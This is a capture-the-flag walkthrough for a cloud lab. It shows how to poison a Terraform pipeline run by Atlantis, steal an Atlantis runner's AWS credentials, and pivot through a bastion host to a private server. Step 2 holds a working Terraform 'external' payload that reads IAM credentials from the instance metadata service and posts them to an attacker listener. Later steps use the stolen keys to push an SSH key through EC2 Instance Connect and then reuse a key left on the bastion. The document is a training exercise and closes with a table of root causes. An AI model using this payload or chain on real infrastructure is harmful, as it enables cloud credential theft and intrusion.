# supply_chain_eic_pivot — Walkthrough

> **WARNING: Full spoilers ahead. Only read this if you are stuck.**

## Exploitation Route

![Exploitation Route](exploitation_route.png)

## Summary

1. Log in to GitLab as `000_ops` and discover `infra-repo` with `autoplan.enabled: true` in `atlantis.yaml`
2. Inject a malicious `external` data source into `main.tf`, push a branch, and open a Merge Request to trigger `terraform plan`
3. Capture the Atlantis runner's IAM credentials exfiltrated via IMDS to your external listener
4. Use the stolen credentials to call `ec2-instance-connect:SendSSHPublicKey` and inject your public key into the Bastion Host
5. SSH into the Bastion Host and discover `target-key.pem` at `/home/ubuntu/`
6. Use `target-key.pem` to SSH into the Target Server in the private subnet and read `flag.txt`

## Detailed Walkthrough

### Step 1: GitLab Reconnaissance

Log in to the GitLab instance using the URL and credentials from `assets/gitlab_credentials.txt`.

```bash
# Open the GitLab URL in your browser
# Username: 000_ops
# Password: BeaverPassword123!
```

Navigate to `infra-repo` → `atlantis.yaml`. The critical misconfiguration is:

```yaml
autoplan:
  enabled: true        # ← terraform plan runs on ANY merge request, no approval needed
apply_requirements: [approved]  # apply requires approval, but plan does not
```

Any `.tf` file change in a Merge Request will trigger `terraform plan` without any review.

### Step 2: Pipeline Poisoning — Injecting Malicious Terraform

Clone the repository and create a new branch:

```bash
git clone http://000_ops:BeaverPassword123!@<GITLAB_URL>/000_ops/infra-repo.git
cd infra-repo
git checkout -b exploit/steal-creds
```

Append the following block to `main.tf`. Replace `<YOUR_LISTENER_URL>` with your webhook endpoint (e.g., [webhook.site](https://webhook.site)):

```hcl
data "external" "steal_creds" {
  program = ["sh", "-c", <<-EOT
    ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
    CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)
    curl -s -X POST "<YOUR_LISTENER_URL>" \
      -H "Content-Type: application/json" \
      -d "$CREDS"
    echo '{"status":"done"}'
  EOT
  ]
}
```

Push and open a Merge Request:

```bash
git add main.tf
git commit -m "chore: update storage config"
git push origin exploit/steal-creds
# Open MR via GitLab UI: exploit/steal-creds → main
```

Atlantis triggers `terraform plan` automatically within seconds.

### Step 3: Capturing IAM Credentials

Check your listener. You will receive the Atlantis runner's temporary credentials:

```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}
```

Configure them locally:

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
export AWS_DEFAULT_REGION="us-east-1"

# Verify the stolen identity
aws sts get-caller-identity
```

### Step 4: EC2 Instance Connect — Gaining Bastion Access

Enumerate EC2 instances to find the Bastion Host ID and public IP:

```bash
aws ec2 describe-instances \
  --query 'Reservations[].Instances[].[InstanceId,PublicIpAddress,Tags[?Key==`Name`].Value|[0]]' \
  --output table
# Look for the instance tagged "*-bastion-host-*"
```

Generate a throwaway SSH key pair:

```bash
ssh-keygen -t rsa -f /tmp/eic-key -N ""
```

Push your public key to the Bastion via EC2 Instance Connect (valid for 60 seconds):

```bash
aws ec2-instance-connect send-ssh-public-key \
  --instance-id <BASTION_INSTANCE_ID> \
  --instance-os-user ubuntu \
  --ssh-public-key file:///tmp/eic-key.pub
```

SSH in immediately:

```bash
ssh -i /tmp/eic-key ubuntu@<BASTION_PUBLIC_IP>
```

### Step 5: Lateral Movement — Pivoting to the Target Server

On the Bastion Host, list the home directory:

```bash
ls -la /home/ubuntu/
# You will find: target-key.pem (chmod 400)
```

From the EC2 enumeration in Step 4, note the Target Server's private IP (tagged `*-target-server-*`).

SSH into the Target Server using the discovered key:

```bash
ssh -i /home/ubuntu/target-key.pem ubuntu@<TARGET_SERVER_PRIVATE_IP>
```

### Step 6: Capture the Flag

```bash
cat /home/ubuntu/flag.txt
# FLAG{SUPPLY_CHAIN_EIC_SUCCESS_<hex_string>}
```

---

## Key Vulnerabilities Exploited

| Phase | Vulnerability | Root Cause |
|---|---|---|
| 1 | `autoplan.enabled: true` | Unauthenticated `terraform plan` execution on any MR |
| 2 | IMDS v1 accessible | No IMDSv2-only enforcement on Atlantis runner |
| 3 | Overprivileged IAM role | `ec2-instance-connect:SendSSHPublicKey` on all instances |
| 4 | SSH key left on Bastion | Ops credential hygiene failure |
